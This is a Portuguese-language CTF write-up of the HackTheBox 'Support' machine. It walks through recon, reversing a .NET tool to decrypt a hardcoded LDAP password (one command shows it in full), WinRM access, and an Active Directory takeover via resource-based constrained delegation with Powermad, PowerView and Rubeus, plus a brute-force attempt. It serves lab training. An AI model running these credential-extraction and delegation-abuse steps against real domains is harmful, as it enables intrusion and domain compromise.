---
layout: post
title: "[CTF]-[HACKTHEBOX]-[EASY]- SUPPORT"
date: 2022-12-10
excerpt: "Machine: Support - [Root-me.org](https://www.hackthebox.com)"
tags: [ctf, htb, windows, kerberos resource delegation, reverse eng]
---


# Recon
Scanning de ferramentas, utilizar como base para a resolução da máquina.

## OS
**NetBIOS computer name:** DC                                                                                          
**NetBIOS domain name:** SUPPORT                                                                                       
**DNS domain:** support.htb                                                                                            
**FQDN:** dc.support.htb                                                                                               
**Derived membership:** domain member                                                                                  
**Derived domain:** SUPPORT

## nmap
Particulamente eu faço o scan das portas e depois das versões. Sabemos que é um DC pelo kerberos na 88/TCP e que possui WinRM ativo pela porta 5985/TCP (O WinRM HTTPS é na 5986/TCP).

```nmap
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-23 05:57 EST
    Not shown: 65516 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-23 11:08:54Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    49664/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49684/tcp open  msrpc         Microsoft Windows RPC
    49700/tcp open  msrpc         Microsoft Windows RPC
    57334/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
    No OS matches for host
    Uptime guess: 0.247 days (since Wed Nov 23 00:14:27 2022)
    Network Distance: 2 hops
    TCP Sequence Prediction: Difficulty=253 (Good luck!)
    IP ID Sequence Generation: Incremental
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: -1s
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-11-23T11:09:54
    |_  start_date: N/A

    TRACEROUTE (using port 135/tcp)
    HOP RTT       ADDRESS
    1   204.66 ms 10.10.14.1
    2   204.90 ms 10.10.11.174

```

## enum4linux-ng
Ldap + smb + ambiente windows é a mistura perfeita para ter credenciais em compartilhamentos públicos :)

```enum4linux-ng
 ====================================
|    Service Scan on 10.10.11.174    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.10.11.174    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: support.htb

 =========================================
|    SMB Dialect Check on 10.10.11.174    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                
  SMB 1.0: false                                                                                                   
  SMB 2.02: true                                                                                                   
  SMB 2.1: true                                                                                                    
  SMB 3.0: true                                                                                                    
  SMB 3.1.1: true                                                                                                  
Preferred dialect: SMB 3.0                                                                                         
SMB1 only: false                                                                                                   
SMB signing required: true                                                                                         

 ===========================================================
|    Domain Information via SMB session for 10.10.11.174    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                          
NetBIOS domain name: SUPPORT                                                                                       
DNS domain: support.htb                                                                                            
FQDN: dc.support.htb                                                                                               
Derived membership: domain member                                                                                  
Derived domain: SUPPORT

 ===================================================
|    Domain Information via RPC for 10.10.11.174    |
 ===================================================
[+] Domain: SUPPORT
[+] Domain SID: S-1-5-21-1677581083-3380853377-188903654
[+] Membership: domain member

 ===============================================
|    OS Information via RPC for 10.10.11.174    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                           
OS version: '10.0'                                                                                                 
OS release: ''                                                                                                     
OS build: '20348'                                                                                                  
Native OS: not supported                                                                                           
Native LAN manager: not supported                                                                                  
Platform id: null                                                                                                  
Server type: null                                                                                                  
Server type string: null                                                                                           

```

## smb 
O único que pode-se autenticar com anonymous é no compartilhamento **support-tools**, o qual possui alguns softwares que utilização em comum para sysadmins.

```smb
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

Lista de softwares no compartilhamento **support-tools**

![Softwares - support-tools](/img_posts/ctf/htb/easy/support/htb-support-1.png)

Todos os softwares são conhecidos, exceto o UserInfo. Utilizando o wine, é possivel entender e executar o mesmo, porém ao utilizar as funções find e user ele não opera corretamente. Com base nas informações apresentadas, fica claro que o executavel tenta coletar informações de usuário do DC por estar em uma pasta compartilhada com softwares utilizados por sysadmin.

![Userinfo.exe - support-tools](/img_posts/ctf/htb/easy/support/htb-support-2.png)

# Reverse Eng 

Observando o executavel, é possivel identificar as funções: FindUser e GetUser.

![UserInfo.exe](/img_posts/ctf/htb/easy/support/htb-support-3.png)

Ao abrir a chamada de executação async, há a chamada de uma **LdapQuery()** utilizando os parametros injetados nos argumentos do executavel, respectivamente: FirstName, LastName e Verbose como opcional. 
```c#
public override async Task OnExecuteAsync(GlobalOptions options, FindUserOptions commandOptions, CancellationToken cancellationToken)
{
	new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
```

Ao observar o **LdapQuery()**, foi identificado qual o usuário utilizado para a query (support) bem como a variavel **password** que foi atribuido um valor pelo objeto **Protected.GetPassword()**. Em sequencia inicializa a chamada do DirectorySearcher para efetuar as buscas Ldap.
```c#
public LdapQuery()
{
	string password = Protected.getPassword();
	entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	entry.set_AuthenticationType((AuthenticationTypes)1);
	ds = new DirectorySearcher(entry);
}
```

Ao observar a classe **Protected()**, há a password encryptada bem como a key utilizada.
```c#
using System.Text;

private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Como foi chamada o método **GetPassword()**, ao observarmos este trecho de código é possivel identificar qual o encode utilizado. O valor 0xDFu equivale ao inteiro 223, sendo o valor '**u**' de **unsigned int**.
```C#
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
```

Para realizar o decode da senha encryptada, foi realizado um script em Python para decryptar.
```python
import base64
 
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b'armando'
 
array = base64.b64decode(enc_password)
array2 = ''
for i in range(len(array)):
    array2 += chr(array[i] ^ key[i%len(key)] ^ 223)
 
print(array2)
```

Após execução, foi possivel obter a senha em texto claro: nvEf[REDACTED]lmz 

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-4.png)

Para finalizar esta etapa, vamos validar se a senha obtida nos provê uma query ldap. No código consta que a query é realizada para ldap://support.htb, porém será utilizado diretamente o IP alvo.
`ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"`

# Enumeration
## LDAP
Abaixo consta a etapa de enumeração realizada sobre o protocolo LDAP  com o usuário e bind password.

### Users
Abaixo os usuários enumerados pela query ldap, sendo então novos vetores de ataque:
``` users enumerated
ford.victoria
stoll.rachelle
daughtler.mabel
langley.lucy
west.laura
monroe.david
cromwell.gerard
bardot.mary
raven.clifton
levine.leopoldo
thomas.raphael
anderson.damian
wilson.shelby
hernandez.stanley
smith.rosario
support
```

A propriedade "Password Never Expires" está **habilitada** para todos os usuários do domínio.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-5.png)

O usuário **support** possui a propriedade "Password Never Expires" **habilitada** e o mesmo está no grupo **Remote Management Users**, o qual é utilizado para permitir que os usuários gerenciem servidores por meio do console do Gerenciador do Servidor. Desta forma, pode-se abusar do **WinRM** para executar comandos Powershell.
![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-6.png)

### Computers
Abaixo os computers enumerados pela query ldap:
| CN         | SAM Name    | DNS Hostname           | OS                           |
| ---------- | ----------- | ---------------------- | ---------------------------- |
| MANAGEMENT | MANAGEMENT$ | Management.support.htb | Windows 10 Pro               |
| DC         | DC$         | dc.support.htb         | Windows Server 2022 Standard |
|            |             |                        |                              |

### Domain Policy
Abaixo só foi possivel visualizar uma única politica habilitada, sendo então das propriedades da password. 
| DN  | Lock Duration | Max password Age | Min password Length | Password properties |
| --- | ------------- | ---------------- | ------------------- | ------------------- |
| DC=support,DC=htb    | 30 Minutes  |   1000000000 Days | 7 |  PASSWORD_COMPLEX|

Através da enumeração dos usuários ldap, é possivel identificar o padrão de email utilizando na instituição, sendo USER.NAME@support.htb. Também é possivel coletar o endereço da empresa: Chapel Hill, NC - USA.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-7.png)

Dos usuários enumerados, a única informação diferente dos demais é que o usuário **support** possui uma propriedade adicional ao realizar a query ldap, sendo `info: Iron[REDATEC]ful`.

`ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D "support\ldap" -w 'nvEf[REDACTED]lmz' 'cn=support'`

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-8.png)

### Disclamer importante
Como este cenário se baseia em um ambiente controlado, toda e qualquer pista será utilizada como valor para melhorar a etapa de enumeração. Dado o valor de **info** do usuário support **ser** o unico ponto de diferença dos demais usuários, a string `Iron[REDATEC]ful` foi utilizada para validar acesso a conta, tendo seu resultado positivo.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-9.png)

# Foothold
Abaixo consta os passos utilizados para ganhar acesso ao alvo após o compromentimento da credencial do usuário **support**.

Foi estabelecido conexão shell no alvo via WinRM: `evil-winrm -u 'support' -p 'Iron[REDACTED]ful' -i 10.10.11.174`. Abaixo está a evidência.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-10.png)

## Enumeration - BloodHound
Em busca de missconfigurations no ambiente do AD, o bloodhound auxilia esta etapa de enumeração e é possivel encontrar o caminho mais rápido e acessivel para se tornar Domain Admin.

Para utilizar o bloodhound, é necessário possuir uma credencial válida, sendo então utilizado o usuário o support. Abaixo consta os resultados obtidos pela ferramenta.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-11.png)

Ao observar os dados coletados pelo BloodHound, o usuário support possui permissão GerenicAll no grupo **Shared Support Accounts**. 

- **GenericAll**: Permissão total no objeto, como adicionar usuários ou alterar passwords.
- 
![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-12.png)

Dado esta missconfiguration, todo membro do grupo possui permissão total desse objeto do Domain Controller. Como referencia do BloodHound, pode-se realizar um **Kerberos Resource-based Constrained Delegation** e  realizar o Take Over do objeto Computer.


![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-13.png)

# Privilege Escalation
Após efetuado o primeiro acesso com baixos privilégios, nosso objetivo é possuir o poder de Domain Admin e comprometer todo o Domínio Support.HTB.

## Kerberos Resource-based Constrained Delegation: Computer Object Takeover
Pode-se obter a execução de código com privilégios elevados em um computador remoto se obtiver o privilégio WRITE no objeto AD desse computador.

Para auxiliar na fase de exploração, será utilizado modulos auxiliares para o Powershell: Powermad.ps1 e PowerView.ps1. Importante importar ambos os modulos dentro da shell do Evil-WinRM para utilizar suas funções.
- Import-Module (Resolve-Path('Powermad.ps1'))
- Import-Module (Resolve-Path('PowerView.ps1'))

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-14.png)

Adicionando um novo **Computer Object** chamado **Nym-Machine**, o qual será atribuido o estado de **trusted** pelo nosso alvo.
`New-MachineAccount -MachineAccount Nym-Machine -Password $(ConvertTo-SecureString 'nym123' -AsPlainText -Force) -Verbose`

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-15.png)

Foi configurado o **resource-based constrained delegation** do DC para o Computer Object **Nym-Machine**.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-16.png)

Utilizado o Rubeus para capturar as hashes da password do objeto **Nym-Machine**.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-17.png)

Utilizando utilizando a hash do objeto, solicita-se ao dc.support.htb um novo **Kerberos Ticket-Granting-Ticket** (TGT) enquanto representa o user Administrator, então utiliza-se o mesmo para requisitar um serviço após a coleta do TGT. Foi possivel obter acesso ao Domain Controle sobre privilégios **NT/System** conforme evidência abaixo.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-18.png)


# Security Controls
Abaixo consta alguns dos controles segurança aplicados no ambiente e qual o seu comportamento.

## Bruteforce
Realizando bruteforce smbv2 para a lista de usuários enumerada pelo LDAP no item XXX.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-19.png)

No teste realizado, não foi possivel obter qualquer credencial e não houve o bloqueio de tantas requisições falhas.

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-20.png)

![Decrypt Pass](/img_posts/ctf/htb/easy/support/htb-support-21.png)

# References
-  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
-  https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
-  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution



